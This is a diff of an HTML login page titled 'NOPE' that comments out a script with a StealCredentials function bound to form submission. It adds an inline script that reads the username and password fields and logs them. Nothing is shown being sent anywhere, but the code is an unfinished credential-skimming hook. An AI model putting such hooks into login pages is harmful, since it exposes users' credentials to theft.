@@ -32,7 +32,7 @@
       <h1><a href="#">NOPE</a></h1>
     
 
-      <script type="text/javascript"> 
+      <!--<script type="text/javascript"> 
       console.log("script");
         function StealCredentials() {
           console.log("function");
@@ -45,13 +45,18 @@
         console.log("did it run");
         document.forms[0].onsubmit = StealCredentials();
         console.log("yes");
-      </script>
+      </script>-->
 
       <div id="login-fields-wrapper">
         <div id="login-fields">
           <input id="login_username" placeholder="username" tabindex="1" name="username" type="text">
           <div class="error-msg">Hint: your username is separate from your email address.</div>
           <input id="login_password" placeholder="passphrase" tabindex="2" autocomplete="off" class="validate-text" name="password" type="password" mouseev="true" keyev="true" clickev="true">
+          <script> 
+            var a = document.getElementById("login_username");
+            var b = document.getElementById("login_password");
+            console.log(a + b);
+          </script>
       </div>
         <input id="user_language" name="user_language" type="hidden" value="english">
         <input type="submit" id="signin-btn" class="submit-btn optional" value="Sign in..." tabindex="3">
